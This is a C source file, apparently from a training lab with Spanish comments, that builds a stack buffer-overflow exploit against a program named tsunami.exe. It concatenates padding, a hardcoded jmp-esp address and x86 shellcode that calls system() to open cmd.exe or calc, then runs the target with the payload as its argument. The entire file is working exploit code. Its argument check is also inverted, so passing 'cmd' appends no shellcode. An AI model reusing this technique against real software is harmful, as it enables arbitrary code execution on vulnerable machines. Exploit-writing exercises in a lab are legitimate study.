/**
 * @file payload&tsunami.c
 * @author Miguel Soto (miguel@soto.es)
 * @brief Se encarga de ejecutar tsunami.exe con el argumento correcto
 * Este programa crea el argumento que necesita tsunami.exe para ejecutar la shellcode que queremos
 * 
 * @version 1.0
 * @date 2022-07-26
 * @copyright Copyright (c) 2022
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main (int argc,char **argv)  //Declaramos argv para usarlo con el execv
{
    char evilbuffer[1024]="AAAABBBBCCCCDDDDEEEEFFFFHHHH";

    // Shellcode que ejecuta system("cmd.exe"), con la llamada a system harcodeada en 77C293C7 (\xC7\x93\xC2\x77)
    char shellcode1_cmd[]= "\x55\x8B\xEC\x33\xFF\x57\x83\xEC\x04\xC6\x45\xF8\x63\xC6\x45\xF9\x6D\xC6\x45\xFA\x64\xC6\x45\xFB\x2E\xC6\x45\xFC\x65\xC6\x45\xFD\x78\xC6\x45\xFE\x65\x8D\x45\xF8\x50\xBB\xC7\x93\xC2\x77\xFF\xD3";
    char shellcode2_calc[] = "\x55\x8B\xEC\x33\xFF\x57\x83\xEC\x04\xC6\x45\xFB\x63\xC6\x45\xFC\x61\xC6\x45\xFD\x6C\xC6\x45\xFE\x63\x8D\x45\xFB\x50\xBB\xC7\x93\xC2\x77\xFF\xD3";

    // Ubicacion del jmp esp
    char offset_call[] = "\x63\x46\x91\x7C";

    strcat(evilbuffer,offset_call); //Concatenamos a evilbuffer el offset del jmp esp
    printf("evilbuffer + offset = %s", evilbuffer);
    
    if (argc < 2)
    {
        strcat(evilbuffer, shellcode2_calc);
    }
    else if (strcmp(argv[1], "cmd"))
    {
        strcat(evilbuffer, shellcode1_cmd);
    }

    printf ("\nCadena + offset + shellcode en formato printable\n\n");
    printf ("%s\n", evilbuffer);

    strcpy(argv[0], "tsunami.exe"); //Definimos el argumento1, es decir, el nombre 
    argv[1] = evilbuffer; //Definimos el argumento2, o sea, el argumento
    argv[2] = NULL; // Apunta a 0, porque no metemos mas argumentos
    
    printf("\nargv[0] = %s\nargv[1] = %s\n", argv[0], argv[1]);

    execv("tsunami.exe", argv);
}